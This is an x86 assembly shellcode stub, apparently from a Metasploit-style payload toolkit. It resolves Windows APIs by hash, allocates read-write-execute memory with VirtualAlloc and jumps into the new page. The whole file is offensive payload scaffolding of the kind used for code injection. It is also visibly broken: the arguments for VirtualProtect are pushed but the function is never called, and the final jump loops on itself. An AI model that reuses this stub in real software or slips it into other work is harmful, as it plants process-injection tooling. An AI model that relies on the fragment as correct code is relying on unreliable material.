[BITS 32]
[ORG 0]


	call prestart		; push eip on stack for recovery
prestart:
	pusha			; save all registers for later use

	cld			; Clear the direction flag.
	call start		; Call start, this pushes the address of 'api_call' onto the stack.
delta:				;
%include "block_api.asm" ;
start:                   ;
	pop ebp                ; Pop off the address of 'api_call' for calling later.

allocate_size:
	mov esi,0x100

allocate:
	push byte 0x40          ; PAGE_EXECUTE_READWRITE
	push 0x1000             ; MEM_COMMIT
	push esi                ; Push the length value of the wrapped code block
	push byte 0             ; NULL as we dont care where the allocation is.
	push 0xE553A458         ; hash( "kernel32.dll", "VirtualAlloc" )
	call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );


protect:
	push dword 0		; oldProctect
	push dword 0x40		; PAGE_EXECUTE_READWRITE
	push 0x100		; size 
	push eax		; address	
	push 0xC38AE110 	; kernel32.dll!VirtualProtect

; Copy pattern to new page and then jump to it
	mov word [eax], 0xe0ff  ; Copy jmp eax (0xffe0) to the address stored in eax
	jmp eax			; jump to page


	
